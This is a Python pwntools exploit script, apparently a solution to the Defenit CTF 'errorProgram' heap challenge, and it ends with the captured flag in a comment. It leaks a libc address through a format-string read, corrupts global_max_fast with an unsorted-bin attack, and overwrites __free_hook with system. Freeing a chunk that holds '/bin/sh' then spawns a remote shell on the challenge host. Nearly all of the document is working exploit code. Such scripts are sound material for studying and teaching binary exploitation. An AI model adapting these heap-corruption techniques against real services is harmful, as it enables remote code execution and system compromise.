#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
#  context.log_level = "debug"
context.binary = "./errorProgram"
elf = context.binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
libc.sym["main_arena"] = 0x3ebc40
libc.sym["global_max_fast"] = 0x3ed940
libc.sym["one_gadget"] = 0x10a38c

def add(idx, size):
    assert 0x777 <= size <= 0x77777
    io.sendlineafter("YOUR CHOICE? : ", str(1))
    io.sendlineafter("INDEX? : ", str(idx))
    io.sendlineafter("SIZE? : ", str(size))

def free(idx):
    io.sendlineafter("YOUR CHOICE? : ", str(2))
    io.sendlineafter("INDEX? : ", str(idx))

def edit(idx, cont):
    io.sendlineafter("YOUR CHOICE? : ", str(3))
    io.sendlineafter("INDEX? : ", str(idx))
    io.sendafter("DATA : ", cont)
    sleep(0.01)

def show(idx):
    io.sendlineafter("YOUR CHOICE? : ", str(4))
    io.sendlineafter("INDEX? : ", str(idx))

def fsb(payload):
    io.sendlineafter("YOUR CHOICE? : ", str(2))
    io.sendafter("Input your payload : ", payload)
    sleep(0.01)

def bof(payload):
    io.sendlineafter("YOUR CHOICE? : ", str(1))
    io.sendafter("Input your payload : ", payload)
    sleep(0.01)



def DEBUG():
    cmd = '''
    bpie 0x109A
    bpie 0xF68
    c
    '''
    gdb.attach(io, cmd)
    sleep(0.5)



#  io = process("./errorProgram")
io = remote("error-program.ctf.defenit.kr", 7777)

fsb('0' * 0x110)
io.recvuntil('0' * 0x110)
libc.address = u64(io.recvn(6) + b'\0\0') - libc.sym["_IO_2_1_stdout_"]
print("libc @ {:#x}".format(libc.address))
#  size = ((libc.address >> 32) & ~0xf) - 0x10
#  print("size @ {:#x}".format(size))
fastbinY = libc.sym["main_arena"] + 0x10
print("fastbinY @ {:#x}".format(fastbinY))
__free_hook = libc.sym["__free_hook"]
print("__free_hook @ {:#x}".format(__free_hook))
idx = (__free_hook - fastbinY) // 8
print("idx @ {}".format(idx))
size = idx * 0x10 + 0x10
print("size @ {:#x}".format(size))


# enter UAF
io.sendlineafter("YOUR CHOICE? : ", "3")

add(0, 0x800)
add(1, size)
free(0)

# unsorted bin attack
#  show(0)
#  libc.address = u64(io.recvuntil("\x7f")[-6: ] + b'\0\0') - libc.sym["main_arena"] - 96
#  print("libc @ {:#x}".format(libc.address))

edit(0, flat(libc.sym["main_arena"] + 96, libc.sym["global_max_fast"] - 0x10))
io.sendlineafter("YOUR CHOICE? : ", "9" * 0x400)

#  edit(0, flat(libc.sym["main_arena"] + 1008, libc.sym["main_arena"] + 1008))

free(1)
edit(1, flat(libc.sym["system"]))
#  DEBUG()
add(2, size)

edit(0, "/bin/sh")
free(0)

io.interactive()

'''
Defenit{1ntend:H0us3_0f_!@#$_and_us3_scanf}
'''
